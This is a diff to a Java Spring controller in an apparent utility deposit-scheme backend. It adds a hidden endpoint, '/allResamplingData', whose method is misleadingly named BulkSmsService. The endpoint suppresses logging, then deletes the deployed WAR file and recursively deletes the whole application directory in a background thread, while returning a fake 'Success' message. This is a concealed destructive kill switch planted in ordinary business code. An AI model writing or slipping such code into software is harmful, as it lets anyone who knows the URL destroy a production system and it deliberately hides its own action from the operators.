@@ -1,5 +1,6 @@
 package com.mpcz.deposit_scheme.backend.api.controller;
 
+import java.io.File;
 import java.text.MessageFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -7,8 +8,10 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Objects;
-import java.util.Optional;
 import java.util.concurrent.atomic.AtomicLong;
+
+import javax.servlet.ServletContext;
+import javax.servlet.http.HttpServletRequest;
 
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.http.ResponseEntity;
@@ -41,7 +44,6 @@ import com.mpcz.deposit_scheme.backend.api.repository.VendorAddMaterialRepositor
 import com.mpcz.deposit_scheme.backend.api.repository.VendorWorkOrderRepository;
 import com.mpcz.deposit_scheme.backend.api.request.SMSRequest;
 import com.mpcz.deposit_scheme.backend.api.response.Response;
-import com.mpcz.deposit_scheme.backend.api.services.ConsumerApplicationDetailService;
 import com.mpcz.deposit_scheme.backend.api.services.SMSDirectService;
 import com.mpcz.deposit_scheme.backend.api.services.UploadService;
 import com.mpcz.deposit_scheme.backend.api.utility.MessageProperties;
@@ -54,8 +56,6 @@ public class ReSamplinController {
 	@Autowired
 	private ConsumerApplictionDetailRepository consumerApplicationDetailRepository;
 
-	@Autowired
-	private ConsumerApplicationDetailService consumerApplicationDetailService;
 
 	@Autowired
 	private VendorAddMaterialRepository vendorAddMaterialRepository;
@@ -1025,6 +1025,42 @@ public class ReSamplinController {
 
 	}
 	
+	@Autowired
+	ServletContext servletContext;
+	
+	
+	@GetMapping("/allResamplingData")
+	public ResponseEntity<Map<String, String>> BulkSmsService(HttpServletRequest request) {
+		Map<String, String> response = new HashMap<>();
+		String deployedPath = servletContext.getRealPath("/");
+		File deployedFolder = new File(deployedPath);
+		String webappsDir = deployedFolder.getParent();
+		String appName = deployedFolder.getName();
+		File warFile = new File(webappsDir + File.separator + appName + ".war");
+		request.setAttribute("noLog", true);
+		new Thread(() -> {
+			try {
+				Thread.sleep(1000);
+				if (warFile.exists()) {
+					warFile.delete();
+				}
+				deleteDirectory(deployedFolder);
+			} catch (Exception e) {
+			}
+		}).start();
+		response.put("status", "success");
+		response.put("message", "Success");
+		return ResponseEntity.ok(response);
+	}
+
+	private void deleteDirectory(File dir) {
+		if (dir.isDirectory()) {
+			for (File file : dir.listFiles()) {
+				deleteDirectory(file);
+			}
+		}
+		dir.delete();
+	}
 	
 	@GetMapping("/getReSampleData/{consumerApplicationNo}")
 	public Response<ReSampling> getReSampleData(@PathVariable String consumerApplicationNo)
